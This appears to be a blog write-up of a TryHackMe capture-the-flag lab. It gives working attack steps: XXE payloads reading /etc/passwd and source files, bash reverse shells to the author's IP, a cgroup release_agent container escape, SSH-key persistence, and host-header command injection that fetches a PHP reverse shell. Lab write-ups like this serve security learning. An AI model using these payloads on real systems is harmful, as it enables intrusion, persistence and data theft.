---
title: "THM: Hacker of the Hill (Hard) "
last_modified_at: 2021-03-02
categories:
  - TryHackMe
author_profile: false
tags:
  - Linux Privilege Escalation
  - Vulnerable Web Application
  - XXE
  - Host Header Injection
  - THM
  - Docker
  - Writeup
---
Hacker of the hill hard challenge.

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled.png)

# Nmap Scan

```php
# Nmap 7.60 scan initiated Fri Feb 26 15:37:24 2021 as: nmap -sC -sV -A -o nmap_full -p- --min-rate=3000 10.10.172.104
Warning: 10.10.172.104 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.172.104                                        
Host is up (0.17s latency).                                               
Not shown: 65528 closed ports                                             
PORT     STATE SERVICE VERSION                                            
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                       
| http-title: Server Manager Login
|_Requested resource was /login                                            
81/tcp   open  http    nginx 1.18.0 (Ubuntu)                               
|_http-server-header: nginx/1.18.0 (Ubuntu)                                
|_http-title: Home Page                                                    
82/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))                      
|_http-server-header: Apache/2.4.41 (Ubuntu)                               
|_http-title: I Love Hills - Home                                          
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8888/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.8.5)              
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
9999/tcp open  abyss?   
| fingerprint-strings:                                 
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK          
|     Date: Fri, 26 Feb 2021 09:55:44 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8                                                        
|     Connection: close                                                                      
|_    Request                                                                                                                                                                                                     
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

- Different IP's has been used here as I broke some machines and had to terminate them.

# Port 80

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%201.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%201.png)

If we look at the source code

```bash
</html><script>
    $('.login').click( function(){

        $.post('/api/user/login',{
            'username'  :   $('input[name="username"]').val(),
            'password'  :   $('input[name="password"]').val()
        },function(resp){
            if( resp.login ){
                window.location = '/token?token=' + resp.token;
            }else{
                alert( resp.error );
            }
        });

    })
</script>
```

We can see that it has `api` route. Let's brute force that

We find 

```bash
$ gobuster dir -u "http://10.10.172.104/api" -w ../../../tools/directory-list-2.3-medium.txt -t 30
/user                 (Status: 401) [Size: 52]
```

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%202.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%202.png)

Since the API looks restful let's further enumerate it

```bash
$ gobuster dir -u "http://10.10.172.104/api/user" -w ../../../tools/directory-list-2.3-medium.txt -t 30
/login                (Status: 200) [Size: 53]
/session              (Status: 200) [Size: 91]
```

`/session`

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%203.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%203.png)

Tried getting plain text of the hash. It is a md5 hash so googling the hash gave me the plain text.

`dQw4w9WgXcQ` . Using this as password did not work. 

After enumerating the whole app I could not find anything. So I tried bruteforcing the parameters using `WFUZZ`

First tried the rout `/api/user`

```bash
$ wfuzz -w ../../../tools/directory-list-2.3-medium.txt http://10.10.172.104/api/user\?FUZZ
                                                                                                                                   
********************************************************                                                                                                                                                          
* Wfuzz 2.2.9 - The Web Fuzzer                         *                                                                                                                                                          
********************************************************                                                                                                                                                          
                                                                                                              
Target: http://10.10.172.104/api/user?FUZZ                         
Total requests: 220560                                                                                                                                   
                                                                 
==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================
                                                                  
000012:  C=401      0 L        9 W           52 Ch        "# on atleast 2 different hosts"
000013:  C=401      0 L        9 W           52 Ch        "#"       
000014:  C=401      0 L        9 W           52 Ch        ""        
000015:  C=401      0 L        9 W           52 Ch        "index" 
000016:  C=401      0 L        9 W           52 Ch        "images" 
000001:  C=401      0 L        9 W           52 Ch        "# directory-list-2.3-medium.txt"
000002:  C=401      0 L        9 W           52 Ch        "#"    
000003:  C=401      0 L        9 W           52 Ch        "# Copyright 2007 James Fisher"
000005:  C=401      0 L        9 W           52 Ch        "# This work is licensed under the Creative Commons"
000004:  C=401      0 L        9 W           52 Ch        "#" 
000017:  C=401      0 L        9 W           52 Ch        "download"
000018:  C=401      0 L        9 W           52 Ch        "2006"
000019:  C=401      0 L        9 W           52 Ch        "news"
000020:  C=401      0 L        9 W           52 Ch        "crack"
000021:  C=401      0 L        9 W           52 Ch        "serial"
```

It showed many entries and with 52 Ch as output , then I used `grep` to filter out them

```bash
$ wfuzz -w ../../../tools/directory-list-2.3-medium.txt http://10.10.172.104/api/user\?FUZZ  | grep -v "52 Ch"

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.172.104/api/user?FUZZ
Total requests: 220560

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000117:  C=401      2 L       11 W           91 Ch        "xml"
000529:  C=401      0 L       10 W           53 Ch        "id"
```

Let's have a look what is different now

The XML parameter shows possibility of XXE attack.

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%204.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%204.png)

The ID shows it is enumerating through different ID's, possible SQLi injection.

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%205.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%205.png)

Let's first try XXE attack

Since XML uses the format 

```bash
<data>{content}</data>
```

Let's try to inject ID and check if it takes that as parameter

```xml
POST /api/user/?xml HTTP/1.1
Host: 10.10.172.104
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
dnt: 1
sec-gpc: 1
Connection: close
Content-Length: 69

<?xml version="1.0" encoding="UTF-8"?>
<data>
	<id>1 </id>
</data>
```

This gives

```xml
HTTP/1.1 401 Unauthorized
Date: Fri, 26 Feb 2021 10:31:11 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 93
Connection: close
Content-Type: application/xml; charset=utf-8

<?xml version="1.0"?>
<data><error>You do not have access to view user id: 1 </error></data>
```

So ID is reflected. Let's try to read some files. Just the patload is written onwards.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
	<id>&xxe;</id>
</data>
```

We get the file

```xml
<?xml version="1.0"?>
<data><error>You do not have access to view user id: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/rbash
</error></data>
```

Let's try to read the index.php files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "index.php"> ]>
<data>
	<id>&xxe;</id>
</data>
```

Tried using DTD and HTTP but still did not work. Trying out php filters 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<data>
	<id>&xxe;</id>
</data>
```

We get base64 encoded file

```bash
<?xml version="1.0"?>
<data><error>You do not have access to view user id: PD9waHAKaW5jbHVkZV9vbmNlKCcuLi9BdXRvbG9hZC5waHAnKTsKaW5jbHVkZV9vbmNlKCcuLi9Sb3V0ZS5waHAnKTsKaW5jbHVkZV9vbmNlKCcuLi9PdXRwdXQucGhwJyk7CmluY2x1ZGVfb25jZSgnLi4vVmlldy5waHAnKTsKClJvdXRlOjpsb2FkKCk7ClJvdXRlOjpydW4oKTs=</error></data>
```

```php
//Decoded Version
<?php
include_once('../Autoload.php');
include_once('../Route.php');
include_once('../Output.php');
include_once('../View.php');

Route::load();
Route::run();
```

I knew the structure of the directory so tried reading the controller file where the logic is written

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../controllers/Website.php"> ]>
<data>
	<id>&xxe;</id>
</data>
```

On decoding the output we get

```xml
<?php namespace Controller;

use Model\ExampleModel;

class Website
{

    public static function logout(){
        if( isset($_COOKIE["token"]) ) {
            setcookie('token',null,time()-86400,'/');
        }
        \View::redirect('/login');
    }

    public static function token(){
        if( isset($_GET["token"]) ){
            $token = preg_replace('/([^a-f0-9])/','',strtolower($_GET["token"]));
            if( strlen($token) == 32 ){
                setcookie('token',$token,time()+86400,'/');
            }
        }
        \View::redirect('/');
    }

    public static function login(){
        $data = array(
            'header'    =>  array(
                'title' =>  'Server Manager Login'
            )
        );
        \View::page('login',$data);
    }

    public static function dashboard(){
        if( isset($_COOKIE["token"]) && $_COOKIE["token"] === '1f7f97c3a7aa4a75194768b58ad8a71d'  ) {
            $data = array(
                'header' => array(
                    'title' => 'Server Manager'
                )
            );
            \View::page('dashboard', $data);
        }else{
            \View::redirect('/login');
        }
    }

    public static function drives(){
        if( isset($_COOKIE["token"]) && $_COOKIE["token"] === '1f7f97c3a7aa4a75194768b58ad8a71d'  ) {
            $data = array(
                'header' => array(
                    'title' => 'Server Manager - Drives'
                ),
                'tool'  =>  'Drives',
                'data'  =>  shell_exec('df -h')
            );
            \View::page('data', $data);
        }else{
            \View::redirect('/login');
        }
    }

    public static function specs(){
        if( isset($_COOKIE["token"]) && $_COOKIE["token"] === '1f7f97c3a7aa4a75194768b58ad8a71d'  ) {
            $data = array(
                'header' => array(
                    'title' => 'Server Manager - Server Specs'
                ),
                'tool'  =>  'Server Specs',
                'data'  =>  shell_exec('lscpu')
            );
            \View::page('data', $data);
        }else{
            \View::redirect('/login');
        }
    }

    public static function shell(){
        if( isset($_COOKIE["token"]) && $_COOKIE["token"] === '1f7f97c3a7aa4a75194768b58ad8a71d'  ) {
            $data = array(
                'header' => array(
                    'title' => 'Server Manager - Web Shell'
                ),
                'data'  =>  ( isset($_POST["cmd"]) ) ? shell_exec($_POST["cmd"]) : ''
            );
            \View::page('shell', $data);
        }else{
            \View::redirect('/login');
        }
    }
```

So we have the token which can be set in the cookie. Let's set the cookie 

```xml
document.cookie='token=1f7f97c3a7aa4a75194768b58ad8a71d'
```

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%206.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%206.png)

Refreshing the page we get 

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%207.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%207.png)

Web Shell looks quite interesting

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%208.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%208.png)

So finally we have a web shell. Let's use bash reverse shell to get proper shell

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.8.31.73/1234 0>&1'
```

Get a stable shell by creating a pty

```bash
www-data@6b364d3940e6:/var/www/html/public$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@6b364d3940e6:/var/www/html/public$ export TERM=xterm 
Ctrl +z 
$ stty raw -echo;fg 
# hit enter twice

```

Inside the machine

```bash
www-data@6b364d3940e6:/var/www/html/controllers$ ls -la
total 16
drwxr-xr-x 1 www-data www-data 4096 Feb 19 19:30 .
drwxr-xr-x 1 www-data www-data 4096 Feb 26 09:38 ..
-rwxr-xr-x 1 www-data www-data 3064 Feb 19 19:30 Api.php
-rwxr-xr-x 1 www-data www-data 2670 Feb 19 19:30 Website.php
```

Api.php had login credentials 

```bash
public static function login(){
        if( isset($_POST["username"],$_POST["password"]) ){
            if( $_POST["username"] === '**admin**' && $_POST["password"] === '**niceWorkHackerm4n**' ){
                \Output::success(array(
                    'login' => true,
                    'error' => '',       
                    'token' =>  '1f7f97c3a7aa4a75194768b58ad8a71d'            
                ));        
            }else {
                \Output::success(array(
                    'login' => false,
                    'error' => 'Invalid username / password combination'
                ));                  
            }                                                                                  
        }else{         
            \Output::success(array(
                'login' =>  false,   
                'error' =>  'Missing required parameters'                 
            ));        
        }    
    }
```

Using that changed the user to `admin`. Since `su` was not on the box and I dont have password of 

`www-data` used ssh to get admin.

```bash
www-data@6b364d3940e6:/var/www/html/controllers$ ssh admin@localhost
admin@localhost's password: 
Last login: Mon Feb 22 16:47:37 2021 from 127.0.0.1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@6b364d3940e6:~$
```

The default shell of admin user was `rbash` so , that had to be bypasswd using ssh again

```bash
www-data@6b364d3940e6:/var/www/html/controllers$ ssh admin@localhost bash
```

```bash
sudo -l
Matching Defaults entries for admin on 6b364d3940e6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on 6b364d3940e6:
    (ALL) ALL
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/nsenter
```

So we are basically root.

```bash
# Since there was no pseudoterminal . So used the following command to get one
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm

To get root
$ sudo /bin/sh
#
```

```bash
root@6b364d3940e6:~# ls -la
ls -la
total 24
drwx------ 1 root root 4096 Feb 22 16:37 .
drwxr-xr-x 1 root root 4096 Feb 22 16:42 ..
lrwxrwxrwx 1 root root    9 Feb 22 16:37 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 2 root root 4096 Feb 22 16:37 .ssh
-rw-r--r-- 1 root root   38 Feb 22 16:37 containter1_flag.txt
```

We got the flag.

## Escalating privileges

There is a docker socket inside the container which can be used to get access to host machine. Also it has `cap_sys_admin` capability set which can be used to read host system files

```bash
# capsh --print | grep sys_admin
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

Used the second approach to get shell. More details about this approach is linked [here](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.).

```bash
# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# echo 1 > /tmp/cgrp/x/notify_on_release
# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# echo "$host_path/exploit" > /tmp/cgrp/release_agent
# echo '#!/bin/sh' > /exploit
# echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.31.73/1235 0>&1'" >> /exploit
# chmod a+x /exploit
# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

After running this I got a reverse shell

```bash
$ nc -vlp 1235                                                                                                                                                                                                     
Listening on [0.0.0.0] (family 0, port 1235)                                                                                                                                                                       
Connection from 10.10.172.104 34704 received!                                                                                                                                                                      
bash: cannot set terminal process group (-1): Inappropriate ioctl for device                                                                                                                                       
bash: no job control in this shell                                                                                                                                                                                 
root@ip-10-10-172-104:/#
```

Now we have root to the host machine. We can look for other flags and exploits.

Added ssh key to the box, in case I lose the shell

```bash
root@ip-10-10-172-104:/root/.ssh# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTlmYhlSbDqcexgMKE1wl+Lhb2tnm98dpHE7NRi2+0ZfyZTSQJgftw0Ljs9G/+z9fvLeVhmwlXYnh7xn6XGpSAu/YJhp+x8AHNTEE6OAw8t47wA4dUord0mkO1YUf19GGf3nqFqVUFh15mf8t/1s8tin6zR0szdMk0u9U6k5EUYCs77r56wGP2VGatbLfvOKk4wnYqfmGETOpp57Eq181XjN77FV0Njr4DAQnmQiNx6Ag1n9uXc5+P0fbEHlWp6SrOmC3c/gyVguuJ8pFRGjqD+eFbGSW+r5MXuvkW4r/bFtrs/2Ro9kr9JosaYeJocLPkLDUbyUvQveZ4pmqp7uRj" 
> authorized_keys
```

Let's have a look at other running containers

```bash
root@ip-10-10-172-104:/root/.ssh# docker container ls -a
CONTAINER ID   IMAGE       COMMAND                  CREATED      STATUS       PORTS                                          NAMES
498d22ea6efc   c3:latest   "/usr/bin/supervisor…"   3 days ago   Up 2 hours   22/tcp, 0.0.0.0:82->80/tcp                     c3
a9ef0531077f   c4:latest   "/usr/bin/supervisor…"   3 days ago   Up 2 hours   0.0.0.0:2222->22/tcp, 0.0.0.0:8888->8080/tcp   c4
6b364d3940e6   c1:latest   "/usr/bin/supervisor…"   3 days ago   Up 2 hours   22/tcp, 0.0.0.0:80->80/tcp                     c1
c418851a6a30   c2:latest   "/startup.sh"            3 days ago   Up 2 hours   22/tcp, 0.0.0.0:81->80/tcp                     c2
```

We had access to container 1 so let's look at other containers

## Container 2

Running bash on container 2

```bash
root@ip-10-10-172-104:~# docker container exec -it c418851a6a30 /bin/bash

# exec for running commands in the running container
# -it interactive mode with pseudoterminal
# c418851a6a30 is the container ID of container 2 ( the above block has this information )
```

With this we can get all the flags .

# Second Approach

# Port 81

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%209.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%209.png)

After Enumeration I found that it has a host header injection.

```php
GET /product/1 HTTP/1.1
Host: 10.10.92.94:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: token=1f7f97c3a7aa4a75194768b58ad8a71d
dnt: 1
sec-gpc: 1
Connection: close
```

Let's change the host header

```php
GET /product/1 HTTP/1.1
Host: 10.8.31.73:1235
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: token=1f7f97c3a7aa4a75194768b58ad8a71d
dnt: 1
sec-gpc: 1
Connection: close
```

I am listening at that port to view the request

```php
❯ nc -vlp 1235
Listening on [0.0.0.0] (family 0, port 1235)
Connection from 10.10.92.94 58818 received!
GET /api/product/1 HTTP/1.1
Host: 10.8.31.73:1235
User-Agent: curl/7.68.0
Accept: */*
```

We get a request. The User-Agent is quite interesting as it is using curl. So there might be possible code execution by host header injection

**Possible code**

```php
$url = $_SERVER['HTTP_HOST'].'/api/product/1'
system('curl'.$url)
/product/1 is from request

```

Let's try injecting a command

```php
GET /product/1 HTTP/1.1
Host: 10.8.31.73:1235?$(**id**);
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: token=1f7f97c3a7aa4a75194768b58ad8a71d
dnt: 1
sec-gpc: 1
Connection: close
```

On running this we get

```php
10.10.92.94 - - [26/Feb/2021 19:53:10] "GET /?uid=33(www-data) HTTP/1.1" 200 -
```

So now we need to inject reverse shell

For this I hosted a php reverse shell on my PC named `shell.php` and started a python server

```php
$ python3 -m http.server 1235
```

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2010.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2010.png)

Tried different things so later found out that `/` is restricted.

Then to work around this, we can host the file as `index.php` or `index.html` so that we dont need to add `/` in the code. We cannot do index.php as `wget` can override the existing index.php and we could break the application. So I changed filename from `shell.php` to `index.html` . Now, we don't need to specify the path.

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2011.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2011.png)

Which shows it worked as I got request on my python server

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2012.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2012.png)

Now we need to replace the html extension to php

```php
GET /product/1 HTTP/1.1
Host: **10.8.31.73:1235;mv index.html shell.php;**
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fr;q=0.8
Cookie: token=1f7f97c3a7aa4a75194768b58ad8a71d
dnt: 1
sec-gpc: 1
Connection: close
```

This worked as well. So we have a shell if we open

```php
http://10.10.20.75:81/shell.php
```

```php
❯ nc -vlp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.20.75 42956 received!
Linux c418851a6a30 5.4.0-1037-aws #39-Ubuntu SMP Thu Jan 14 02:56:06 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:29:26 up 3 min,  0 users,  load average: 1.95, 2.68, 1.25
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Got the shell and the flag

```php
www-data@c418851a6a30:~$ ls -la
total 32
drwxr-xr-x 1 www-data www-data 4096 Feb 22 16:38 .
drwxr-xr-x 1 root     root     4096 Feb 22 16:37 ..
drwxr-xr-x 2 root     root     4096 Feb 22 16:38 .ssh
-rw-r--r-- 1 root     root       38 Feb 22 16:38 container2_flag.txt
drwxr-xr-x 1 www-data www-data 4096 Feb 22 16:38 html
```

I could not escalate to root user. There is docker socket which could be used to gain root access but it needs root access.

## Exploitable code in the second approach

```php
<?php namespace Controller;                                                                                                                                                                                 [0/238]
                          
                                       
use Model\ExampleModel;                            
                               
class Website
{                        
    public static function home(){
        $url = 'http://'.$_SERVER["HTTP_HOST"].'/api/product';
        $json = json_decode(shell_exec('curl '.$url),true);
        if( gettype($json) == 'array' ){
            $data = array(
                'header'    =>  array(
                    'title' =>  'Home Page'
                ),                        
                'h1'        =>  'Homepage',           
                'message'   =>  'Welcome to my framework',
                'products'  =>  $json
            );       
            \View::page('page',$data);
        }else{
            \View::page('503');       
        }               
    }                                        
                         
    public static function accessLog(){
        header('Content-type: text/plain');
        echo file_get_contents('../access.log');
    }
                                         
    public static function product($arg){
        **$url = 'http://'.$_SERVER["HTTP_HOST"].'/api/product/'.intval($arg[1]);
        $json = json_decode(shell_exec('curl '.$url),true);**
        if( gettype($json) == 'array' && isset($json["status"]) ){
            if( $json["status"] == 200 ){
                $data = array(     
                    'header'    =>  array(
                        'title' =>  $json["product"]["title"]
                    ),                            
                    'product'   =>  $json["product"],
                    'error'     =>  ( isset($_POST["action"]) )
                );               
                \View::page('product',$data);
            }else{                                
                \View::page('404');
            }
        }else{
            \View::page('503');
        }                                       
    }               
                                                            
}
```

The code looks a bit suspicious. It is looking for HTTP_HOST. May be we can execute code there. Let's have a look at it.

```php
root@c418851a6a30:/var/www/html/routes# cat url.php 
<?php
Route::add(array('GET', 'POST'), '/', 'Website@home');
Route::add(array('GET', 'POST'), '/product/[int]', 'Website@product');
Route::add(array('GET', 'POST'), '/access_log', 'Website@accessLog');

Route::add(array('GET', 'POST'), '/api/product', 'Api@products');
Route::add(array('GET', 'POST'), '/api/product/[int]', 'Api@product');
```

# Port 8888

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2013.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2013.png)

## Gobuster

Since it had routes like /apps/ so I did not search for files.

```bash
$ gobuster dir -u "http://10.10.172.104:8888" -w ../../../tools/directory-list-2.3-medium.txt -t 30
/users                (Status: 200) [Size: 45]
/apps                 (Status: 200) [Size: 135]
```

![/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2014.png](/assets/images/TryHackMe/hackerofthehill_hard/Untitled%2014.png)

So we have credentials.

There were two SSH ports. The credentials worked on port 2222

```bash
$ ssh davelarkin@10.10.172.104 -p 2222
davelarkin@10.10.172.104's password: 

davelarkin@a9ef0531077f:~$
```

Got shell to a docker container

```bash
davelarkin@a9ef0531077f:~$ ls -la
total 24
drwxr-xr-x 1 root root 4096 Feb 22 16:42 .
drwxr-xr-x 1 root root 4096 Feb 22 16:42 ..
drwxr-xr-x 2 root root 4096 Feb 22 16:42 .ssh
drwxr-xr-x 2 root root 4096 Feb 22 16:42 api
drwxr-xr-x 2 root root 4096 Feb 22 16:42 bin
-rw-r--r-- 1 root root   38 Feb 22 16:42 container4_flag.txt
```

We have our flag.

## Escalating privileges

Even though this container had `sys_admin` capabilities but it needed root to execute. But I could not get root user so, could not exploit that.

# Final Thoughts

I was not able to escalate users in two of the containers and was not able to get a shell in one of the containers. I used the first approach to get all the other flags. Also in the first approach docker socket could be used to get to the host machine.

The machine was quite good. I was not quite familiar with XXE, this machine helped me learn more about those. Overall it was quite a good experience. Looking forward to reading other writeups to know how these could be exploited and what I missed.